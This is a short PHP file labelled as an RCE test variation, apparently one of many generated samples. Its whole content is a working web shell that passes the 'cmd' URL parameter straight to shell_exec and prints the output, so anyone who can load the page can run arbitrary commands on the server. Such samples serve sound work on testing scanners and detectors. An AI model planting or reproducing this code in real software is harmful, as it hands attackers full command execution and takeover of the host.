<?php
// RCE test variation #501
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>